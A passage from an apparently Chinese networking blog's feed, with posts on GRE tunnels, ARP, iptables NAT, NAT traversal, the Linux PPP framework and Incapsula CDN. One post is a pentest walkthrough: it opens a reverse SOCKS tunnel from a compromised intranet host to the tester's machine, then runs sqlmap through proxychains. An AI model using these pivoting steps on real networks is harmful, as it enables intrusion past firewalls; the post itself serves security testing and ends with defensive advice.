并设置对端IP为111.2.33.28。隧道数据包将被从121.207.22.123也就是本地IP地址发起，其TTL字段被设置为255。隧道设备分配的IP地址为10.10.10.1，掩码为255.255.255.0。<br>在host B上面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#  ip tunnel add gre1 mode gre remote  121.207.22.123 local 111.2.33.28 ttl 255</div><div class="line">#  ip link set gre1 up</div><div class="line">#  ip addr add 10.10.10.2 peer 10.10.10.1 dev gre1</div><div class="line">#  ip tunnel add gre1 mode gre remote  121.207.22.123 local 111.2.33.28 ttl 255</div><div class="line">#  ip link set gre1 up</div><div class="line">#  ip addr add 10.10.10.2 peer 10.10.10.1 dev gre1</div></pre></td></tr></table></figure></p><p>此时，host A 和 host B 建立起GRE隧道了。</p><ol><li>检测连通性</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># ping 10.10.10.2 (host A)</div><div class="line">PING 10.10.10.2 (10.10.10.2) 56(84) bytes of data.</div><div class="line">64 bytes from 10.10.10.2: icmp_req=1 ttl=64 time=0.319 ms</div><div class="line">64 bytes from 10.10.10.2: icmp_req=2 ttl=64 time=0.296 ms</div><div class="line">64 bytes from 10.10.10.2: icmp_req=3 ttl=64 time=0.287 ms</div><div class="line"># ping 10.10.10.2 (host A)</div><div class="line">PING 10.10.10.2 (10.10.10.2) 56(84) bytes of data.</div><div class="line">64 bytes from 10.10.10.2: icmp_req=1 ttl=64 time=0.319 ms</div><div class="line">64 bytes from 10.10.10.2: icmp_req=2 ttl=64 time=0.296 ms</div><div class="line">64 bytes from 10.10.10.2: icmp_req=3 ttl=64 time=0.287 ms</div></pre></td></tr></table></figure><ol><li>撤销GRE隧道<br>在任一一端操作下面命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># ip link set gre1 down</div><div class="line"># ip tunnel del gre1</div><div class="line"># ip link set gre1 down</div><div class="line"># ip tunnel del gre1</div></pre></td></tr></table></figure></li></ol><p>转载请注明来自运维生存时间: <a href="http://www.ttlsa.com/html/4138.html" target="_blank" rel="external">http://www.ttlsa.com/html/4138.html</a></p>]]></content>
    
    <summary type="html">
    
      其他国家的互联网如同一个孤岛。要想访问国外网站异常的缓慢，甚至被和谐了。可以建立一条隧道来避免这种情况，下面说说GRE隧道如何建立。 1. GRE介绍
GRE隧道是一种IP-over-IP的隧道，是通用路由封装协议，可以对某些网路层协议的数据报
    
    </summary>
    
      <category term="NETWORK" scheme="http://demonelf.github.io/categories/NETWORK/"/>
    
    
  </entry>
  
  <entry>
    <title>使用ARP的四种典型情况</title>
    <link href="http://demonelf.github.io/NETWORK/%E4%BD%BF%E7%94%A8ARP%E7%9A%84%E5%9B%9B%E7%A7%8D%E5%85%B8%E5%9E%8B%E6%83%85%E5%86%B5.html"/>
    <id>http://demonelf.github.io/NETWORK/使用ARP的四种典型情况.html</id>
    <published>2019-08-29T04:16:16.198Z</published>
    <updated>2019-08-29T04:14:14.962Z</updated>
    
    <content type="html"><![CDATA[<p>使用ARP的四种典型情况</p><p>1.发送方是主机，把IP数据包发送到本网络上的另一个主机。这时用ARP找到目的主机的硬件MAC地址。  </p><p>2.发送方是主机，要把IP数据报发送到另一个网络上的主机。这时用ARP找到本网络上的一个<a href="https://www.2cto.com/net/router/" target="_blank" rel="external">路由器</a>（网关）的硬件MAC地址。剩下的工作由这个路由器来完成。 </p><p>3.发送方是路由器，要把IP数据报转发到本网络上的一个主机。这时用ARP找到目的主机的硬件MAC地址 </p><p>4.发送方是路由器，要把IP数据报转发到另一个网络的一个主机。这时用ARP找到本网络上的一个路由器（网关）的硬件地址。剩下的工作有这个路由器来完成。</p><p>主机和路由器表现的行为是一致的，区别在于，路由器可以作为网关，而PC不可以。当要把IP数据报转发另一个网络的一个主机时，ARP找到本网络上的一个网关的硬件MAC地址，这个网关可以是路由器，也可以是三层<a href="https://www.2cto.com/net/switch/" target="_blank" rel="external">交换机</a>。</p><p>纯二层交换机是没有ARP表项的。交换机是否有ARP表项取决于交换机是否作为三层设备（配置三层路由接口或SVI接口）</p><p>网络层使用的是IP地址，但在实际网络的链路上传送数据帧时，最终必须使用该网络的硬件地址。 </p><p>每一个主机都设有一个ARP高速缓存，里面有本局域网上的各主机和网关的IP地址到硬件地址的映射表。也就是说，一个主机可以通过ARP到本局域网的其他主机，到达其他网络主机的工作交给网关完成。</p><p>同一子网 源目mac地址都不会改变 </p><p>不同子网 源目IP地址都不会改变，改变源目MAC地址</p>]]></content>
    
    <summary type="html">
    
      使用ARP的四种典型情况 1.发送方是主机，把IP数据包发送到本网络上的另一个主机。这时用ARP找到目的主机的硬件MAC地址。
2.发送方是主机，要把IP数据报发送到另一个网络上的主机。这时用ARP找到本网络上的一个路由器（网关）的硬件MAC地址。剩
    
    </summary>
    
      <category term="NETWORK" scheme="http://demonelf.github.io/categories/NETWORK/"/>
    
    
  </entry>
  
  <entry>
    <title>linux-iptables nat设置路由转换</title>
    <link href="http://demonelf.github.io/NETWORK/linux-iptables%20nat%E8%AE%BE%E7%BD%AE%E8%B7%AF%E7%94%B1%E8%BD%AC%E6%8D%A2.html"/>
    <id>http://demonelf.github.io/NETWORK/linux-iptables nat设置路由转换.html</id>
    <published>2019-08-29T04:16:16.198Z</published>
    <updated>2019-08-29T04:13:51.065Z</updated>
    
    <content type="html"><![CDATA[<p>DNAT（Destination Network Address Translation,目的地址转换) 通常被叫做目的映射。而SNAT（Source Network Address Translation，源地址转换）通常被叫做源映射。</p><p>这是我们在设置<a href="http://lib.csdn.net/base/linux" title="Linux知识库" target="_blank" rel="external">Linux</a>网关或者防火墙时经常要用来的两种方式。以前对这两个都解释得不太清楚，现在我在这里解释一下。</p><p>首先，我们要了解一下IP包的结构，如下图所示：<br><img src="http://blog.myhnet.cn/wp-content/uploads/2009/01/iphdr.gif" alt="ipv4"><br>在任何一个IP数据包中，都会有Source IP Address与Destination IP Address这两个字段，数据包所经过的路由器也是根据这两个字段是判定数据包是由什么地方发过来的，它要将数据包发到什么地方去。而iptables的DNAT与SNAT就是根据这个原理，对Source IP Address与Destination IP Address进行修改。</p><p>然后，我们再看看数据包在iptables中要经过的链（chain）：<br><img src="http://blog.myhnet.cn/wp-content/uploads/2009/01/netfilter_packet_flow.png" alt="**netfilter_packet_flow**"></p><p>图中正菱形的区域是对数据包进行判定转发的地方。在这里，系统会根据IP数据包中的destination ip address中的IP地址对数据包进行分发。如果destination ip adress是本机地址，数据将会被转交给INPUT链。如果不是本机地址，则交给FORWARD链检测。<br>这也就是说，我们要做的DNAT要在进入这个菱形转发区域之前，也就是在PREROUTING链中做，比如我们要把访问202.103.96.112的访问转发到192.168.0.112上：</p><p><code class="hljs lasso has-numbering">iptables -t nat -A PREROUTING -d 202.103.96.112 -j DNAT –to-destination 192.168.0.112</code></p><p>这个转换过程当中，其实就是将已经达到这台<a href="http://lib.csdn.net/base/linux" title="Linux知识库" target="_blank" rel="external">linux</a>网关（防火墙）上的数据包上的destination ip address从202.103.96.112修改为192.168.0.112然后交给系统路由进行转发。</p><p>而SNAT自然是要在数据包流出这台机器之前的最后一个链也就是POSTROUTING链来进行操作</p><p><code class="hljs lasso has-numbering">iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -j SNAT –to-source 58.20.51.66</code></p><p>这个语句就是告诉系统把即将要流出本机的数据的source ip address修改成为58.20.51.66。这样，数据包在达到目的机器以后，目的机器会将包返回到58.20.51.66也就是本机。如果不做这个操作，那么你的数据包在传递的过程中，reply的包肯定会丢失。</p><p>假如当前系统用的是ADSL/3G/4G动态拨号方式，那么每次拨号，出口IP都会改变，SNAT就会有局限性。</p><p><code class="hljs lasso has-numbering">iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o eth0 -j MASQUERADE</code></p><p>重点在那个『 MASQUERADE 』！这个设定值就是『IP伪装成为封包出去(-o)的那块装置上的IP』！不管现在eth0的出口获得了怎样的动态ip，MASQUERADE会自动读取eth0现在的ip地址然后做SNAT出去，这样就实现了很好的动态SNAT地址转换。</p><p>补充：<br>这里防火墙要进行转发必须打开内核路由转发功能，即：</p><p><code class="hljs avrasm has-numbering"><br>echo “1” &gt; /proc/sys/net/ipv4/ip_forward //开启路由转发<br>sysctl -p //使能sysctl设置<br>输出：<br>net.ipv4.ip_forward = 1  //这里为1，开启转发成功。<br>net.ipv4.conf.default.rp_filter = 1<br>net.ipv4.conf.default.accept_source_route = 0<br>kernel.sysrq = 0<br>kernel.core_uses_pid = 1<br>……<br>……<br></code> </p><p>问题：</p><p><code class="hljs avrasm has-numbering">echo “1” &gt; /proc/sys/net/ipv4/ip_forward<br>cat /proc/sys/net/ipv4/ip_forward</code></p><p>[root@Coohx ~]# sysctl -p<br>net.ipv4.ip_forward = 0   //  应该为1！！！！<br>net.ipv4.conf.default.rp_filter = 1<br>net.ipv4.conf.default.accept_source_route = 0<br>kernel.sysrq = 0<br>kernel.core_uses_pid = 1</p><p>解决办法：</p><p> <code class="hljs avrasm has-numbering">vim  /etc/sysctl.conf<br>将<br>        net.ipv4.ip_forward = 0<br>改为<br>        net.ipv4.ip_forward = 1<br>[root@Coohx ~]# sysctl -p<br>net.ipv4.ip_forward = 1  //  一直为1<br>……<br>……</code></p><p>注：手动修改/proc/sys/net/ipv4/ip_forward 0为1 ，内核不允许 <code>&quot;/proc/sys/net/ipv4/ip_forward&quot; 警告: 此文件自读入后已发生变动！！！ 确实要写入吗 (y/n)?y &quot;/proc/sys/net/ipv4/ip_forward&quot; E667: 同步失败 请按 ENTER 或其它命令继续</code></p>]]></content>
    
    <summary type="html">
    
      DNAT（Destination Network Address Translation,目的地址转换) 通常被叫做目的映射。而SNAT（Source
Network Address Translation，源地址转换）通常被叫做源映射。 这是我们在设置
    
    </summary>
    
      <category term="NETWORK" scheme="http://demonelf.github.io/categories/NETWORK/"/>
    
    
  </entry>
  
  <entry>
    <title>nat穿透</title>
    <link href="http://demonelf.github.io/NETWORK/nat%E7%A9%BF%E9%80%8F.html"/>
    <id>http://demonelf.github.io/NETWORK/nat穿透.html</id>
    <published>2019-08-29T04:16:16.198Z</published>
    <updated>2019-08-29T04:13:59.001Z</updated>
    
    <content type="html"><![CDATA[<p><img src="nat分类.png" alt=""></p><p>作者：陈军链接：<a href="https://www.zhihu.com/question/38729355/answer/77877260" target="_blank" rel="external">https://www.zhihu.com/question/38729355/answer/77877260</a></p><p>来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。      </p><p>​    NAT分为两大类，基本的NAT和NAPT（Network Address/Port Translator）。<br>基本的NAT，它仅将内网主机的私有IP地址转换成公网IP地址，但并不将TCP/UDP端口信息进行转换，有动态与静态之区分。由于现在大部分都属于另一种类型，即NAPT，故这里不详细讨论基础NAT。 另外一种NAT叫做NAPT（Network Address/Port Translator），从名称上我们也可以看得出，NAPT不但会改变经过这个NAT设备的IP数据报的IP地址，还会改变IP数据报的TCP/UDP端口。</p><p>​      NAPT又分为锥型（Cone）和对称型（Symmetric），它们的区别在于，在NAT已分配端口号给Client A的情况下，如果Client A继续用1235端口与另一外网服务器通讯，锥型NAT还会继续用原来62000端口，即所分配的端口号不变。而对于对等型NAT，NAT将会分配另一端口号（如62001）给Client A的1235端口。也就是说，同一内网主机同一端口号，对于锥型NAT，无论与哪一外网主机通讯，都不改变所分配的端口号；而对于对等型NAT，同一内网主机同一端口号，每一次与不同的外网主机通讯，就重新分配另一个端口号。 </p><p>​    目前比较常用的NAT类型是完全锥型NAT。</p><ol><li>首先目前绝大多数的路由器都是非对称型NAT(Cone NAT)，所以P2P技术才能正常使用。 对称/非对称的区别主要在于：网关设备在实现NAT时，对于内网某主机的若干个UDP连接请求，网关设备对应地在外网上所建立的UDP端口数量。对称NAT是一个请求对应一个端口，非对称NAT是多个请求对应一个端口(象锥形，所以叫Cone NAT)。</li><li>对称型NAT(Symmetric NAT)是无法实现P2P技术。 </li></ol><p>​    对于两方都是对称nat的情况，至少从可以了解的途径上（比如google，相关论坛）都没找到解决方案，我们自己也进行过测试，不行。</p><p>​    但是对于一端是对称nat，一端是端口限制性Cone nat的情况是可以打洞成功的，特别是我们实验的对称nat的端口变化还是有规律的（加1），我们使用端口猜测的方法进行打洞成功率还是非常高的。对于端口变化无规律的对称nat，这个猜测还是靠算法的设计，</p><p>可以看看<strong>A New Method for Symmetric NAT Traversal </strong>in UDP and TCP </p><p>（<a href="http://www.goto.info.waseda.ac.jp/~wei/file/wei-apan-v10.pdf）" target="_blank" rel="external">http://www.goto.info.waseda.ac.jp/~wei/file/wei-apan-v10.pdf）</a></p>]]></content>
    
    <summary type="html">
    
      作者：陈军链接：https://www.zhihu.com/question/38729355/answer/77877260
来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ​ NAT分为两大类，基本的NAT和NAP
    
    </summary>
    
      <category term="NETWORK" scheme="http://demonelf.github.io/categories/NETWORK/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux PPP 框架分析</title>
    <link href="http://demonelf.github.io/NETWORK/Linux%20PPP%20%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90.html"/>
    <id>http://demonelf.github.io/NETWORK/Linux PPP 框架分析.html</id>
    <published>2019-08-29T04:16:16.182Z</published>
    <updated>2019-08-29T04:13:31.024Z</updated>
    
    <content type="html"><![CDATA[<ol><li>介绍</li></ol><p>通过对Linux源代码的分析,了解PPP设备在linux内的工作原理.顺便了解一下PPPoE如何利用PPP设备来完成上网的工作的.下面是代码研究的基础版本：</p><p>Software      version<br>Linux内核    2.6.15<br>PPPd    ppp-2.4.3<br>PPPoE    rp-pppoe-3.8</p><ol><li><p>PPP相关模块及结构</p><p><img src="PPP框架原理.jpg" alt=""></p></li></ol><p>注：每个模块左上角或右上角蓝色字体的数字是用来方便区别每个模块。</p><p>每个层次及工作在该层次的程序（模块）分析如下：</p><p>2.1 应用层模块概述</p><p>工作在该层的模块编号：（1）Pppd、（2）Pppoe、（10）网络应用程序</p><p>2.1.1   Pppd</p><p>使用源代码ppp-2.4.3编译生成，该程序用来完成PPP过程（lcp/pap/chap/ipcp等）的应用程序.它和Pppoe两个用户态应用程序配合起来,可以完成PppOe的拨号上网的链路协商及维护.</p><p>熟悉Ppp相关协议的知道,Ppp链路协商过程有LCP/PAP/CHAP/PAP等很多协议.这些包会经由协议栈分类,提交到字符设备/dev/ppp0的队列中.而Pppd这个应用程序,就是从ppp0中将这些包读取出来,然后递交到各协议的子过程中去处理,从而在应用态完成这些协议的处理过程.</p><p>这里需要提一点,要想深入的理解Pppd应用程序的工作方法,必须要了解字符设备ppp0是如何工作的.</p><p>2.1.2   Pppoe</p><p>首先,pppoe完成了PPPoE Discovery过程,这个过程很简单,只有PADI/PADO, PADR/PADS四个包.主要目的是相互告知MAC地址.</p><p>另外,这个程序负责接收和发送Pppoe链路的所有数据包,包括ppp协议过程的数据包,也包括正常网络应用通过网络接口ppp发送的TCP/IP数据包.在此需要了解类型为0x8863/0x8864的Socket如何工作,另外需要了解数据包如何通过PTY设备在Pppoe和PPP协议栈之间传递的.在内核模块概述中会给予描述.</p><p>所以,我们可以将pppoe应用程序作为拨号链接进入主机的入口,所有的数据包都经由它进入主机.</p><p>2.1.3   网络应用程序</p><p>这里指一般网络应用，比如上网、下载等。主要作用是描述普通数据包的行走路径.</p><p>2.2 内核层模块概述</p><p>工作在该层的模块编号：（3）/dev/ppp%n、（4）TCP/IP协议栈、（5）Socket、（6）PPP协议栈、（7）PTY设备、（8）ETH1</p><p>2.2.1   /dev/ppp%n</p><p>该设备需要打开内核支持,可以make menuconfig选择相应的子项,另外需要在/dev目录下创建主设备号为108从设备号为0的字符设备才可以在用户态使用.</p><p>创建了ppp设备后，ppp过程的数据包经过协议栈的分类,会被送到该接口的队列内.用户态应用程序(如pppd)从该接口内读取ppp过程的数据包，然后送交相应的协议栈处理.对于响应的数据包,同样可以写入到该设备中,设备内会将数据包送交协议栈然后转发出去.</p><p>2.2.2   TCP/IP协议栈</p><p>普通Linux TCP/IP协议栈.</p><p>2.2.3   Socket</p><p>PppOe Session和Discovery数据包对应的以太网类型分别为0x8863/0x8864,因为这两种类型的数据包是由Pppoe应用程序通过Socket来收发的,所以内核中需要定义这两种类型的Socket.这两个Socket内核处理非常简单,只做了最基本的检查便由Pppoe收取上来.</p><p>2.2.4   PPP协议栈</p><p>主要负责PPP层数据的封装、压缩与解压缩.另外,它还对普通数据包和Ppp过程的数据包进行了分流,将普通数据包提交到TCP/IP协议栈,而将Ppp过程的数据包放到/dev/ppp设备队列中,等待Pppd去收取并处理.</p><p>2.2.5   PTY设备</p><p>串行设备，PPP内核协议栈与pppoe应用程序的中转站.因为Ppp协议早多运行在串行链路上,所以在Linux内核中PPP协议栈与串行设备结合紧密.</p><p>2.2.6   Eth1</p><p>这里是指连接以太网的出口,用来表示数据包路径而引入.</p><p>2.3 物理层模块概述</p><p>工作在该层的模块编号：（9）以太网驱动</p><ol><li>PPPoE拨号建立的过程</li></ol><p>从拨号链接开始到用户可以上网主要分三个过程：</p><p>Ø PPPoE Discovery过程</p><p>Ø PPP过程</p><p>Ø 设置上网主机</p><p>3.1 PPPoE Discovery 过程</p>]]></content>
    
    <summary type="html">
    
      1. 介绍
通过对Linux源代码的分析,了解PPP设备在linux内的工作原理.顺便了解一下PPPoE如何利用PPP设备来完成上网的工作的.下面是代码研究的基础版本：
Software version Linux内核 2.6.15 PPPd ppp-
    
    </summary>
    
      <category term="NETWORK" scheme="http://demonelf.github.io/categories/NETWORK/"/>
    
    
  </entry>
  
  <entry>
    <title>Socks代理反弹突破内网</title>
    <link href="http://demonelf.github.io/NETWORK/Socks%E4%BB%A3%E7%90%86%E5%8F%8D%E5%BC%B9%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91.html"/>
    <id>http://demonelf.github.io/NETWORK/Socks代理反弹突破内网.html</id>
    <published>2019-08-29T04:16:16.182Z</published>
    <updated>2019-08-29T04:13:37.081Z</updated>
    
    <content type="html"><![CDATA[<p><strong>随着信息安全意识的提升，越来越多的信息系统前端均部署有防火墙，系统管理员根据业务需求将内部必要的服务端口通过端口映射等手段映射到公网中，如默认**</strong>web<strong>服务端口</strong>80<strong>、</strong>MSSQL<em>*数据库服务端口</em>1433等。通过部署防火墙可以将信息系统内部区域与公网逻辑隔离开来，利用相关的策略有效避免或减轻来自外部的攻击。</p><p>对于渗透测试者来说，如何绕过防火墙的阻挡在内网展开渗透测试成为亟需解决的问题，本文介绍了在夺取映射到外网的内网服务器权限后，如何利用socks代理反弹获得内网访问权限。</p><p>1.sSocks</p><p>sSocks是一个<a href="http://www.freebuf.com/news/topnews/111545.html" target="_blank" rel="external">socks代理</a>工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为0.0.13，可在以下链接处下载。</p><p><a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="external">http://sourceforge.net/projects/ssocks/</a></p><p>下载解压后，执行命令编译。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure &amp;&amp; make</div></pre></td></tr></table></figure><p>编译完成，进入src目录，会发现有nsocks、ssocksd、ssocks、rcsocks，其功能说明介绍如下：</p><p>程序 功能<br><strong>nsocks</strong> 类似通过Socks5代理后的netcat，可用来测试socks server<br><strong>ssocksd</strong> 用来开启Socks5代理服务<br><strong>ssocks</strong> 本地启用Socks5服务，并反弹到另一IP地址<br><strong>rcsocks</strong> 接收反弹过来的Socks5服务，并转向另一端口</p><p><strong>2.模拟网络环境说明</strong></p><p> 本文模拟的网络环境见下图1，渗透测试端IP为192.168.10.50，内网区域IP段192.168.206.0/24，内网区域能正常访问192.168.10.0/24，现假设已获得192.168.206.130权限。 </p><p><a href="http://image.3001.net/uploads/image/20130901/20130901105859_75679.jpg" target="_blank" rel="external"><img src="http://image.3001.net/uploads/image/20130901/20130901105859_75679.jpg" alt="模拟的网络环境"></a></p><p><strong>3.实施Socks代理反弹</strong><br><strong>1)本地监听端口</strong><br>在渗透测试端192.168.10.50执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./rcsocks -l 1088 -p 1080 -vv</div></pre></td></tr></table></figure><p>等待远程Socks5服务器访问本地1080端口，创建端口1080与本地端口1088的连接通道，如图2。 </p><p><a href="http://image.3001.net/uploads/image/20130901/20130901105926_77843.jpg" target="_blank" rel="external"><img src="http://image.3001.net/uploads/image/20130901/20130901105926_77843.jpg" alt="Socks代理反弹突破内网"></a></p><p><strong>2)开启Socks5代理服务，反弹</strong><br>在192.168.206.130上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./rssocks -vv -s 192.168.10.50:1080</div></pre></td></tr></table></figure><p>启用Socks5服务，反弹到192.168.10.50的端口1080上，如图3。 </p><p><a href="http://image.3001.net/uploads/image/20130901/20130901110001_38329.jpg" target="_blank" rel="external"><img src="http://image.3001.net/uploads/image/20130901/20130901110001_38329.jpg" alt="开启Socks5代理服务，反弹"></a></p><p>此时在渗透测试端192.168.10.50可看到通道连接成功，效果如图4。</p><p><a href="http://image.3001.net/uploads/image/20130901/20130901110020_58042.jpg" target="_blank" rel="external"><img src="http://image.3001.net/uploads/image/20130901/20130901110020_58042.jpg" alt="通道连接成功"></a></p><p><strong>4.利用proxychains进行Socks5代理</strong><br>通过前面的步骤，Socks5代理已创建完成了。由于在渗透测试过程中，需要使用不同的工具程序，而在各程序中分别配置Socks5代理信息较为繁琐，而部分程序并不支持配置Socks5代理。为了简化这些操作，我们可以采用proxychains。<br>proxychains是一个代理客户端软件，可以支持几乎所有程序的代理，如ssh，telnet，ftp等。利用proxychains，程序能在代理的环境下被加载运行，而本身不需要具备代理功能。使用前需要对proxychains进行简单配置，打开配置文件proxychains.conf（在BT5位于/etc/proxychains.conf），如图5所示，在[ProxyList]处添加<br><strong>socks5 127.0.0.1 1088</strong></p><p><a href="http://image.3001.net/uploads/image/20130901/20130901110043_92020.jpg" target="_blank" rel="external"><img src="http://image.3001.net/uploads/image/20130901/20130901110043_92020.jpg" alt="利用proxychains进行Socks5代理"></a></p><p>配置成功后若要启动程序，仅需要在启动程序命令前加上proxychains。<br><strong>1)启用浏览器firefox，在终端执行命令：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">proxychains firefox</div></pre></td></tr></table></figure><p>firefox启动成功，访问192.168.206.135的web服务如图6，通过代理访问成功。</p><p><a href="http://image.3001.net/uploads/image/20130901/20130901110125_93242.jpg" target="_blank" rel="external"><img src="http://image.3001.net/uploads/image/20130901/20130901110125_93242.jpg" alt="通过代理访问成功"></a></p><p><strong>2)利用sqlmap进行注入：</strong><br>先切换到sqlmap目录<br>cd /pentest/database/sqlmap<br>proxychains python sqlmap.py -u “存在SQL注入的链接” –dbs<br>注入成功，注入点信息及获取数据库信息如图7所示。</p><p><a href="http://image.3001.net/uploads/image/20130901/20130901110208_52827.jpg" target="_blank" rel="external"><img src="http://image.3001.net/uploads/image/20130901/20130901110208_52827.jpg" alt="利用sqlmap进行注入"></a></p><p><strong>5.后记</strong><br>由于系统管理员的疏忽或者业务需求所致，防火墙一般仅对由外向内发起的数据连接进行严格判断、过滤、甚至阻断而忽略由内往外的连接。因此，在此种情况下，通过攻陷映射到公网的端口服务，利用反弹便可获取内网访问权限，给内网安全带来极大的威胁。在信息安全建设与运维过程中，不仅要加强映射到公网的服务安全，也要重视由内到外连接的安全威胁。</p>]]></content>
    
    <summary type="html">
    
      随着信息安全意识的提升，越来越多的信息系统前端均部署有防火墙，系统管理员根据业务需求将内部必要的服务端口通过端口映射等手段映射到公网中，如默认**web服务端口80、MSSQL*数据库服务端口1433等。通过部署防火墙可以将信息系统内部区域与公网逻辑隔离开
    
    </summary>
    
      <category term="NETWORK" scheme="http://demonelf.github.io/categories/NETWORK/"/>
    
    
  </entry>
  
  <entry>
    <title>Incapsula免费CDN服务申请使用及加速效果测评</title>
    <link href="http://demonelf.github.io/NETWORK/Incapsula%E5%85%8D%E8%B4%B9CDN%E6%9C%8D%E5%8A%A1%E7%94%B3%E8%AF%B7%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8A%A0%E9%80%9F%E6%95%88%E6%9E%9C%E6%B5%8B%E8%AF%84.html"/>
    <id>http://demonelf.github.io/NETWORK/Incapsula免费CDN服务申请使用及加速效果测评.html</id>
    <published>2019-08-29T04:16:16.182Z</published>
    <updated>2019-08-29T04:13:23.344Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343221Y0-0.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>作为差不多和cloudflare一道被国内的站长们认识的Incapsula，其提供的免费CDN加速服务一直可以正常使用，且有多个CDN节点可供选择。而cloudflare提供的免费CDN服务虽然不错，但是不知道是不是因为国内用户用太多了还是其他什么原因，现在用起来总会有各种问题。</p><p>Incapsula最早部落是在三年前介绍的，现在之所以要再次分享一下Incapsula的免费CDN申请使用教程，一来是给不是很了解Incapsula的朋友一个简单普及，Incapsula的CDN其实有不少的高级用法；二来是Incapsula最近推出的香港CDN节点，很必要来体验不同的CDN节点在国内连接速度快慢。</p><p>根据部落自己的统计，Incapsula可供查询的CDN节点共有60多个，主要是分布在美国、爱尔兰、日本、中国香港等地区，由于Incapsula的CDN服务是全球服务网络，因此只要有一个节点缓存了我们的网站，就可以在其它CDN节点上访问了。明白了这一点，我们就可以指定自己的CDN节点为日本或者香港。</p><p>一般来说，网站放在亚太地区的话国内用户访问会感觉比美国主机要快一些，本篇文章就来对比一下Incapsula的日本、香港和美国CDN节点在国内的访问连接速度状况。Incapsula以前免费CDN套餐月流量为50GB，刚刚去官网查看了一下发现免费CDN套餐现以已经没有明确说明多少月流量限制。</p><p>看了一下Incapsula的付费套餐也都没有月流量限制，区别主要是在防护攻击、CDN高级功能等方面，所以目前姑且认为Incapsula提供免费CDN服务没有流量限制，但是只是基本的CDN加速，应该在CDN资源利用方面作了限制。（部落刚刚狂刷新自己测试博客，有遇到一次超出资源配额提示，由此推测Incapsula在访问连接方面作了人为限制）</p><p><strong>Incapsula免费CDN服务申请使用:日本、香港、美国CDN加速效果测评</strong></p><p><strong>一、Incapsula免费CDN申请使用</strong></p><p>1、Incapsula官网：</p><p>1、官方网站：<a href="http://www.incapsula.com/" target="_blank" rel="external">http://www.incapsula.com/</a></p><p>2、进入Incapsula官网，直接注册一个账号，然后登录到Incapsula管理后台，添加一个你想要使用CDN加速的网站。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/13432220Q-1.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>3、等Incapsula检测你的域名的DNS通过后，就可以点击下一步了。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343221338-2.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>4、然后Incapsula就会给出A记录和CNAME记录。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343221947-3.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>5、你需要到你的域名DNS管理处，将域名的@的A记录修改为Incapsula给你的IP（一般有两个），域名的www的记录修改为Incapsula给你的CNAME记录。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/13432240O-4.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>6、完成了以上操作后，就可以点击完成设置，Incapsula检测到你的域名的DNS更新成功后，你就可以在Incapsula查处和管理你的CDN了。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343221501-5.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p><strong>二、Incapsula CDN管理面板使用</strong></p><p>1、这是Incapsula CDN的管理后台，主要是可以查看CDN流量统计、安全、CDN性能、管理日志等（点击放大）。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/134322CA-6.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>2、在Incapsula的设置当中，你可以查看CDN的源服务器IP地址，如果你的服务器IP有变动，就可以在这里直接修改。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343223B8-7.gif" 